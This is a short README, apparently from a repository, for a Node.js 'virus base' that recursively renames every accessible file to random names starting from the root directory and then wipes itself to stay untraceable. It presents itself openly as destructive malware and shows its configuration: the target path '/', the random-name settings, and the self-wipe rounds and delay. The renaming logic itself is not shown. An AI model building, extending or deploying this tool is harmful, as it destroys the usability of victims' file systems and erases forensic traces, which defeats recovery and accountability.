# nodejs-virus-non-resident-file-rename
#### non-resident file-rename virus base

* recursively rename accessable files
* self destructing and untraceable

```js
const config = {
  dest: '/', // file rename base path
  file: {
    max_name_size: 16, // random filename max length
    ext: ['', 'txt', 'css'] // random file extensions
  },
  alpha: 'abcdefghijklmnopqrstuvwxyz', // random filename alphabet (uppercase added automatically)
  special: '1234567890', // random filename special chars/numbers
  wipe: {
    rounds: 10, // virus file wipe random data write rounds
    delay: 3000 // virus file wipe delay
  }
}

```
